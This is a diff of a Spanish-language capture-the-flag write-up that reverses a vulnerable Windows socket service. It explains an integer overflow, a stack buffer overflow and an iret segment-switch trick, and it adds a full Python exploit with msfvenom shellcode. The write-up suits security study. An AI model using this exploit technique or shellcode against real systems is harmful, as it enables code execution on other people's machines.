@@ -82,9 +82,9 @@
 						<h2><u><b>Análisis</b></u></h2><br>
 
 						Lo primero es lo primero, así que vamos a ejecutar el binario y vemos que levanta un servicio socket en algún puerto.<br><br>
-						<center><img src="../images/bfs2.png" width="60%"></center><br>
+						<center><img src="../images/bfs2.png" width="60%"></center><br><br>
 						Utilizamos <b style="color: brown;">Process Hacker</b> y en la pestaña Network filtramos por el nombre del binario y vemos que el servicio corre en el 31415. Esta es la manera mas fácil de identificar el puerto. Otra forma seria reversando y ver los parámetros de la función <b style="color: brown;">listen()</b>, pero para que nos vamos a complicar.<br><br>
-						<center><img src="../images/bfs3.png" width="80%"></center><br>
+						<center><img src="../images/bfs3.png" width="80%"></center><br><br>
 						Ya con esto creamos la primera estructura del script para que se comunique con el servicio. Este lo utilizaremos mas adelante en el análisis dinámico, por ahora vamos a ir reconociendo el flujo de forma estática.<br><br>
 
 						<textarea class="form-control" rows="20" cols="100" disabled>
@@ -108,14 +108,14 @@ except Exception as e:
     print(e)
 						</textarea><br>
 						Viendo el código identificamos primeramente la función <b style="color: brown;">main()</b>, donde aquí se ejecutan las siguientes acciones que levantan el servicio y realiza algunas comprobaciones de los datos enviados.<br><br>
-						<center><img src="../images/bfs4.png" width="70%"></center><br>
+						<center><img src="../images/bfs4.png" width="70%"></center><br><br>
 						Lo mas importante de aquí es <b style="color: brown;">cmp_msg_hello()</b> que se encarga de comparar los bytes recibidos con una constante llamada “Hello”, si es así sigue el camino correcto al <b style="color: brown;">send()</b> para responder con un “Hi” mediante la conexión socket y poder llegar a la función <b style="color: brown;">packet_filter()</b>.<br><br>
-						<center><img src="../images/bfs5.png" width="50%"></center><br>
+						<center><img src="../images/bfs5.png" width="50%"></center><br><br>
 						Ahora vemos las rutinas de <b style="color: brown;">packet_filter()</b>, es aquí donde se encuentran las vulnerabilidades y donde hay que pensar.<br><br>
-						<center><img src="../images/bfs6.png" width="70%"></center><br>
+						<center><img src="../images/bfs6.png" width="70%"></center><br><br>
 
 						Cuando entra a la función se ejecuta una especie de <b style="color: brown;">memset()</b> sobre el buffer de <b style="color: brown;">virtualAlloc()</b>, modificando los bytes existentes por unos definidos por el binario (5050505050… y CF58585858…) los que tienen un propósito.<br><br>
-						<center><img src="../images/bfs7.png" width="60%"></center><br>
+						<center><img src="../images/bfs7.png" width="60%"></center><br><br>
 						El segundo <b style="color: brown;">recv()</b> recibe una especie de cabecera de paquete que será utilizado para distintas validaciones como tamaño, cookie y el tipo.<br><br>
 						1. <b style="color: brown;">size</b> valida que la cabecera sea menor o igual a 11 bytes de tamaño<br>
 						2. <b style="color: brown;">cookie</b> valida que se envié la cadena Eko2022<br>
@@ -124,7 +124,7 @@ except Exception as e:
 
 						Aquí podemos ver que existe una comparación con signo, el cual nos permite explotar la vulnerabilidad de Integer Overflow enviando un valor negativo que pronto será interpretado como positivo.<br><br>
 						Entonces si en el valor <b style="color: brown;">size</b> de la cabecera enviamos 0xFFFF esto será transformado a 0x0000FFFF el cual es negativo y menor a 0x0F00 logrando la evasión de comparación.<br><br>
-						<center><img src="../images/bfs8.png" width="70%"></center><br>
+						<center><img src="../images/bfs8.png" width="70%"></center><br><br>
 						Cuando se logra la evasión entramos a llama otro <b style="color: brown;">recv()</b> pero con un tamaño que controlamos, en este caso seria el word del valor negativo 0x0000<b style="color: brown;">FFFF</b> y los bytes serán copiados a un buffer ubicado en el heap.<br><br>
 						Seguido se hace una llamada a la función renombrada como <b style="color: brown;">copy_data_heap_to_stack()</b> con los argumentos.<br><br>
 
@@ -135,15 +135,15 @@ except Exception as e:
 								<tr><td><b style="color: chartreuse;">cmdLine</b></td><td>Es un buffer de stack de 3840 bytes</td></tr>
 							</table>
 						</center><br>
-						<center><img src="../images/bfs9.png" width="65%"></center><br>
+						<center><img src="../images/bfs9.png" width="65%"></center><br><br>
 
 						Dentro de <b style="color: brown;">copy_data_heap_to_stack()</b> tenemos una rutina que realiza una copia byte a byte desde el buffer heap al buffer stack, mediante un ciclo for() utilizando como size el 0xFFFF, provocando un desbordamiento de buffer de stack. Ahora lo importante es poder controlar registros o variables de stack que nos permitan seguir con la ejecución, para eso es necesario enviar bytes de tamaño controlado para poder modificar el valor del tipo y poder llegar a <b style="color: brown;">winExec()</b>.<br><br>
-						<center><img src="../images/bfs10.png" width="40%"></center><br>
+						<center><img src="../images/bfs10.png" width="40%"></center><br><br>
 						Antes de llamar a <b style="color: brown;">winExec()</b> se realiza un desplazamiento dentro del buffer y esos bytes son movidos al registro rax el que pisa la dirección de winExec(), por lo tanto no se podrá utilizar la función para ejecutar código. Por ultimo se realiza la llamada.<br><br>
-						<center><img src="../images/bfs11.png" width="60%"></center><br>
+						<center><img src="../images/bfs11.png" width="60%"></center><br><br>
 						Si recuerdan en la función <b style="color: brown;">memset()</b> se modifican los bytes del buffer con 5050505050 y CF58585858. Ahora con el desplazamiento dentro del buffer mas 7 bytes, nos posicionamos justo en los 5050505050. Entonces cuando se realiza la llamada a <b style="color: brown;">winExec()</b> llegamos a los 5050505050, los que se transforman en “<b style="color: brown;">pop rax</b>” permitiendo hacer pop al stack y tomar el control del retorno que serian nuestras A’s con <b style="color: brown;">iret</b>.<br><br>
 						Para esto veremos los <b style="color: brown;">pop rax</b> y validamos con la información del stack.<br><br>
-						<center><img src="../images/bfs12.png" width="45%"></center><br>
+						<center><img src="../images/bfs12.png" width="45%"></center><br><br>
 						Con el siguiente código se comprueba los explicado anteriormente.<br><br>
 						<textarea class="form-control" rows="20" cols="100" disabled>
 #!/usr/bin/python
@@ -212,7 +212,7 @@ except Exception as e:
 								<tr><td><b style="color: chartreuse;">ESP</b></td><td>The stack pointer to load</td></tr>
 								<tr><td><b style="color: chartreuse;">SS</b></td><td>The stack segment selector to change to</td></tr>
 							</table>
-						</center><br>
+						</center><br><br>
 
 						• <b style="color: chartreuse;">EIP</b> es la dirección del inicio del buffer ubicado en el heap en 0x10000000 donde tenemos nuestra data. Pero le daremos un desplazamiento para evitar cualquier tipo de problema quedando en 0x10000014.<br>
 						• <b style="color: chartreuse;">CS</b> indexa la Global Descriptor Table (GDT) con su descriptor code/data en kernel (ring0) y user (ring3).<br>
@@ -220,27 +220,157 @@ except Exception as e:
 						• <b style="color: chartreuse;">ESP</b> es una dirección en medio del buffer ubicado en el heap, pero debe estar por debajo de la shellcode y tampoco debe ser el final como 0x10000600.<br>
 						• <b style="color: chartreuse;">SS</b> indexa la Global Descriptor Table (GDT) con su descriptor code/data en kernel (ring0) y user (ring3).<br><br>
 
-						Una manera fácil de obtener el valor de <b style="color: chartreuse;">EFLAGS</b> es mediante el registro <b style="color: brown;">efl</b>, que se puede visualizar co el depurador windbg.<br><br>
-						<center><img src="../images/bfs13.png" width="55%"></center><br>
+						Una manera fácil de obtener el valor de <b style="color: chartreuse;">EFLAGS</b> es mediante el registro <b style="color: brown;">efl</b>, que se puede visualizar con el depurador windbg o IDA.<br><br>
+						<center><img src="../images/bfs13.png" width="55%"></center><br><br>
 
-						Ahora vamos a calcular el valor de <b style="color: chartreuse;">CS</b> y <b style="color: chartreuse;">SS</b>, ya que son los mas difícil de obtener.<br><br>Cuando se configura el GDT se configuran 5 selectores como el selector nulo, un selector de code/data en modo kernel y un selector de code/data en modo usuario.<br><br>
+						Ahora vamos a calcular el valor de <b style="color: chartreuse;">CS</b> y <b style="color: chartreuse;">SS</b>, ya que son los mas difícil de obtener.<br><br>
+						Cuando se configura el GDT se configuran 5 selectores. Estos índices entre Kernel y usuario tiene un tamaño de 16 bytes y entre code y data por cada modo es de 8 bytes, por lo que los índices del selector son:<br><br>
 
-						Los índices entre Kernel y usuario tiene un tamaño de 16 bytes y entre code y data por cada modo es de 8 bytes, por lo que los índices del selector son:<br><br>
 						• <b style="color: violet;">0x00</b>: Null Descriptor<br>
-						• <b style="color: violet;">0x10</b>: Kernel Code Segment<br>
-						• <b style="color: violet;">0x18</b>: Kernel Data Segment<br>
-						• <b style="color: violet;">0x20</b>: User Code Segment<br>
-						• <b style="color: violet;">0x28</b>: User Data Segment<br><br>
+						• <b style="color: violet;">0x10</b>: Kernel Code Segment (Kernel Mode - ring0)<br>
+						• <b style="color: violet;">0x18</b>: Kernel Data Segment (Kernel Mode - ring0)<br>
+						• <b style="color: violet;">0x20</b>: User Code Segment (User Mode - ring3)<br>
+						• <b style="color: violet;">0x28</b>: User Data Segment (User Mode - ring3)<br><br><br>
 
-						Entonces si queremos pasar a modo usuario (ring3) debemos configurar en 3. Para esto nuestro selector de code segment será [<b style="color: violet;">0x20+0x3=0x23</b>] y el selector de data segment será [<b style="color: violet;">0x28+x03=0x2b</b>].<br><br>
+
+						Entonces si queremos pasar a modo usuario (ring3) debemos configurar el RPL (Requested Privilege Level) o CPL (Current Privilege Level) que en este caso es 3. Para esto nuestro selector de "User Code Segment" será [<b style="color: violet;">0x20+0x3=0x23</b>] y el selector de "User Data Segment" será [<b style="color: violet;">0x28+x03=0x2b</b>].<br><br>
 						<center><img src="../images/bfs14.png" width="55%"></center><br><br>
 
-						Ahora el gran problema que tenemos con el calculo de "User Data Segment", es que el <b style="color: violet;">0x2b</b> es modificado por un 0x00 al entrar a la función <b style="color: brown;">copy_data_heap_to_stack()</b>.<br><br>
-						<center><img src="../images/bfs15.png" width="65%"></center><br>
 
-						<h2><u><b>Explotación</b></u></h2><br>
+						Ahora el gran problema que tenemos con el calculo de "User Data Segment", es que el <b style="color: violet;">0x2b</b> es modificado por un 0x00 al entrar a la función <b style="color: brown;">copy_data_heap_to_stack()</b> y no se almacenara en el Stack, por ende debemos utilizar otro valor.<br><br>
+						<center><img src="../images/bfs15.png" width="65%"></center><br><br>
 
 
+						Para solucionar este problema se debe identificar un valor que pertenezca a data con permisos de lectura y escritura (<b style="color: brown;">Data RW</b>) de manera que usando el comando en windbg <b style="color: brown;">dg 0x53</b> podemos ver la información.<br><br>
+						
+						Con todo armado ya podemos ejecutar y observamos como queda la estructura de parámetros para iret en el stack.<br><br>
+
+						<center><img src="../images/bfs16.png" width="80%"></center><br><br>
+
+						Valor de segmentos previo al salto iret <b style="color: violet;">CS 0x33</b>:<br>
+						<img src="../images/bfs17.png" width="15%"><br><br>
+						Valor de segmentos post al salto iret <b style="color: violet;">CS 0x23</b>:<br>
+						<img src="../images/bfs18.png" width="15%"><br><br>
+
+						Por último, antes de ejecutar la shellcode solo nos quedaría restaurar el registro CS a <b style="color: violet;">0x33</b> para volver a la arquitectura de 64-bits ya que al ejecutar iret nos deja en 32-bits. También restaurar el Stack que por suerte RCX apunta a ahí.<br><br>
+
+						Podemos visualizar previo a la ejecución de iret como todo se mantiene a 64 bit.<br><br>
+						<center><img src="../images/bfs20.png" width="100%"></center><br><br>
+
+						Ahora después de ejecutar iret todo cambia a 86 bits hasta los registros.<br><br>
+						<center><img src="../images/bfs21.png" width="100%"></center><br><br>
+
+						Para esto solo debemos agregar algunos bytes al inicio de la shellcode, así cuando se realice el salto se pueda restablecer a los valores antiguos y ejecutar la shellcode de 64 bits sin problemas.<br><br>
+
+						Al usar un salto lejano como <b style="color: brown;">jmp 0x33:0x1000001C</b> se especificará el "User Code Segment" con el valor 0x33, volviendo a 64 bits (<a href="https://stackoverflow.com/questions/39310831/implement-x86-to-x64-assembly-code-switch" style="color: cornflowerblue" target="_blank">Mas información aquí</a>). Por utlimo los siguientes bytes "<b style="color: brown;">\x48\x89\xC8\x48\x89\xC4</b>" para restablecer el Stack.<br><br>
+
+						<br><h2><u><b>Explotación</b></u></h2><br>
+
+						El siguiente script es el exploit final en Python.<br><br>
+						
+
+						<textarea class="form-control" rows="20" cols="100" disabled>
+#!/usr/bin/python
+# Code By s1kr10s
+import socket
+import struct
+from sys import exit
+
+server = "127.0.0.1"
+port = 31415
+
+restoreCS  = b"\xea\x1c\x00\x00\x10\x33\x00"  # Restaura el valor de CS a 0x33 JMP 0x33:0x1000001c
+restoreRSP = b"\x48\x89\xCC"                  # Restaura el viejo stack pointer con un "mov rsp, rcx"
+
+# msfvenom -a x64 --platform Windows -p windows/x64/exec cmd="calc" -f python -v shellcode
+shellcode = b""
+shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41"
+shellcode += b"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"
+shellcode += b"\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20"
+shellcode += b"\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31"
+shellcode += b"\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
+shellcode += b"\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41"
+shellcode += b"\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0"
+shellcode += b"\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67"
+shellcode += b"\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20"
+shellcode += b"\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34"
+shellcode += b"\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac"
+shellcode += b"\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
+shellcode += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
+shellcode += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+shellcode += b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+shellcode += b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a"
+shellcode += b"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
+shellcode += b"\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
+shellcode += b"\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00"
+shellcode += b"\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00"
+shellcode += b"\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
+shellcode += b"\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
+shellcode += b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
+shellcode += b"\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
+shellcode += b"\xda\xff\xd5\x63\x61\x6c\x63\x00"
+
+try:
+    p32 = lambda x: struct.pack('<I', x);
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    
+    print("[+] Sending Handshake (Hello)")
+    hello = "\x48\x65\x6c\x6c\x6f\x00"                  # invalid handshake
+    s.send(hello)
+    welcome = s.recv(3)
+    
+    if len(welcome) == 3:
+        print("   [-] Response of Hello is: %s" % welcome)
+    
+        header  = "\x45\x6b\x6f\x32\x30\x32\x32\x00"    # wrong cookie value
+        header += "\x54"                                # invalid packet type
+        header += "\xff\xff"                            # int overflow - invalid packet size
+        print("   [-] Header Length %d" % len(header))
+        
+        '''
+        Se explota un Integer Overflow, que permite evadir la condicion de "cmp eax, 0F00h" y 
+        asi mismo modificar el size para el recv(), permitiendole recibir mas bytes.
+        '''
+        
+        size  = 3840                            # size 0x0f00
+        data  = p32(0x10000014)                 # return iret (EIP)
+        data += p32(0x23)                       # user code segment (CS)
+        data += p32(0x246)                      # valid EFLAGS save register
+        data += p32(0x10000500)                 # user stack pointer(ESP)
+        data += p32(0x53)                       # user stack segment (SS)
+        data += restoreCS                       # restaura el valor de CS a 0x33
+        data += restoreRSP                      # restaura el viejo stack pointer "mov rsp, rcx"
+        data += shellcode                       # shellcode
+        data += "\x90" * (size - len(data))     # junk bytes
+        data += "\x58"                          # type - cmp eax, 58h ; 'X'
+        data += "\x90" * 7                      # desplazamiento a los XXXXXXX del buffer convertidos a pop rax
+        print("   [-] Data Length %d" % len(data))
+        
+        '''
+        Se explota un Stack Buffer Overflow, donde se envian 3840 bytes seguido de una caracter "X"
+        para evadir la comparacion de "type" y 7 nop que son utilizados como desplazamiento
+        para llegar a las X's que fueron modificadas en el buffer por la funcion packet_filter(). 
+        
+        Luego con el overflow se explota un Type Confusion, donde nos permite controlar el flujo 
+        corractamente, para llegar a ejecutar la llamada a WinExec(), pero ahora apuntando a las X's que
+        son interpretadas como "pop rax" en memoria, las que ayudan a controlar el retorno de iret.
+        '''
+        
+        print("[+] Sending Payload")
+        payload = header + data
+        s.send(payload)
+        recibe2 = s.recv(20)
+        print("   [-] Response: %s" % recibe2)
+        
+    else:
+        print("I'm Sorry I don't know him")
+        exit()
+        
+except Exception as e:
+    print(e)
+						</textarea><br>
+						<center><img src="../images/bfs19.png" width="100%"></center><br>
                     </p>
                   </td>
                 </tr>
